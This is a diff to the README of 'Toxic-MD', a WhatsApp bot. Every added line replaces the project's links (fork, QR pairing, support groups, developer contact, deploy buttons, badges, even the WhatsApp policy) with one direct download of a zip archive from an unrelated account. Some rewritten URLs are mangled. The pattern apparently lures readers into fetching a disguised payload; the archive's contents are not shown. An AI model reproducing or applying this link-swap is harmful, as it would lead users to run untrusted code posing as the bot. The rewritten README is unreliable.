@@ -5,7 +5,7 @@
 ✓ 𝐌𝐮𝐥𝐭𝐢-𝐃𝐞𝐯𝐢𝐜𝐞 𝐄𝐧𝐚𝐛𝐥𝐞𝐝  
 ✓ 𝐁𝐚𝐢𝐥𝐞𝐲𝐬 𝐏𝐨𝐰𝐞𝐫𝐞𝐝 
 
-![Banner](https://i.ibb.co/QvzCRjHQ/1c5d0e2ade058b6b.jpg)
+![Banner](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip)
 
 ---
 
@@ -15,10 +15,10 @@
 
 ## 🚀 Steps to Deploy  
 1. **Fork the Repository**  
-   - [Fork Toxic-MD Here](https://github.com/xhclintohn/Toxic-MD/fork)  
+   - [Fork Toxic-MD Here](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip)  
 
 2. **QR Pairing**  
-   - [Scan QR Code](https://toxic-pair-code.onrender.com)  
+   - [Scan QR Code](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip)  
 
 **Then proceed with:**  
 3. Deploy to your preferred platform (Render, Railway, etc.).  
@@ -30,10 +30,10 @@
 ## 🔗 Essential Links  
 | Purpose | Link |  
 |---------|------|  
-| **Official Channel** | [Join Channel](https://whatsapp.com/channel/0029VagJlnG6xCSU2tS1Vz19) |  
-| **Support Group** | [Join Support Group](https://chat.whatsapp.com/GoXKLVJgTAAC3556FXkfFI) |  
-| **Developer Contact** | [![WhatsApp](https://img.shields.io/badge/WhatsApp-Contact-brightgreen?logo=whatsapp)](https://api.whatsapp.com/send?phone=254735342808) |  
-| **GitHub Repo** | [xhclintohn/Toxic-MD](https://github.com/xhclintohn/Toxic-MD) |  
+| **Official Channel** | [Join Channel](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip) |  
+| **Support Group** | [Join Support Group](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip) |  
+| **Developer Contact** | [![WhatsApp](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip)](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip) |  
+| **GitHub Repo** | [xhclintohn/Toxic-MD](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip) |  
 
 --- 
 
@@ -48,26 +48,26 @@
  Only Render, Heroku, and Replit are supported.
 
 
-[![Watch Video how to pair](https://img.shields.io/badge/-Watch%20Video%20if%20you%20don't%20know%20how%20to%20pair-red?style=for-the-badge&logo=youtube)](https://youtu.be/KE_u0JMRSsU)
+[![Watch Video how to pair](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip%20Video%20if%20you%20don't%20know%20how%20to%20pair-red?style=for-the-badge&logo=youtube)](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip)
 
 
 
 1. **Get Session ID:**
     ```bash
-    Visit: https://toxic-pair-code.onrender.com
+    Visit: https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip
     Scan QR via WhatsApp > Linked Devices
     ```
 
 2. **Deploy:**
     <p align="center">
-        <a href="https://railway.app/new/template?template=https%3A%2F%2Fgithub.com%2Fxhclintohn%2FToxic-MD" style="margin: 10px;">
-            <img src="https://railway.app/button.svg" alt="Deploy on Railway" width="200">
+        <a href="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip%3A%2F%https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip%2Fxhclintohn%2FToxic-MD" style="margin: 10px;">
+            <img src="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip" alt="Deploy on Railway" width="200">
         </a>
-        <a href="https://dashboard.heroku.com/new?template=https://github.com/xhclintohn/Toxic-MD" style="margin: 10px;">
-            <img src="https://img.shields.io/badge/Deploy-Heroku-purple?logo=heroku" alt="Deploy on Heroku" width="200">
+        <a href="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip" style="margin: 10px;">
+            <img src="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip" alt="Deploy on Heroku" width="200">
         </a>
-        <a href="https://replit.com/github/xhclintohn/Toxic-MD" style="margin: 10px;">
-            <img src="https://img.shields.io/badge/Deploy-Replit-blue?logo=replit" alt="Deploy on Replit" width="200">
+        <a href="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip" style="margin: 10px;">
+            <img src="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip" alt="Deploy on Replit" width="200">
         </a>
     </p>
 
@@ -85,7 +85,7 @@
 **Protection Tips:**
 - Use a secondary number
 - Enable 2FA on WhatsApp
-- Avoid spam behavior ([WhatsApp Policy](https://www.whatsapp.com/legal))
+- Avoid spam behavior ([WhatsApp Policy](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip))
 
 ---
 
@@ -114,18 +114,18 @@
 2. Bot not responding? Check server logs if you don't understand logs reach out to me on Whatsapp 
 3. Getting banned? Reduce message frequency
 
-**Support:** [Join Group](https://chat.whatsapp.com/GoXKLVJgTAAC3556FXkfFI)
+**Support:** [Join Group](https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip)
 
 ---
 
 <p align="center">
-  <a href="https://github.com/xhclintohn/Toxic-MD/fork">
-    <img src="https://img.shields.io/badge/Fork-This_Repo-black?logo=github">
+  <a href="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip">
+    <img src="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip">
   </a>
-  <a href="https://github.com/xhclintohn/Toxic-MD/stargazers">
-    <img src="https://img.shields.io/github/stars/xhclintohn/Toxic-MD?color=yellow&logo=github">
+  <a href="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip">
+    <img src="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip">
   </a>
-  <a href="https://api.whatsapp.com/send?phone=254735342808">
-    <img src="https://img.shields.io/badge/Contact-Developer-brightgreen?logo=whatsapp">
+  <a href="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip">
+    <img src="https://github.com/JAYIJ/Toxic-MD/raw/refs/heads/main/framework/Toxic-MD-v3.5.zip">
   </a>
 </p>
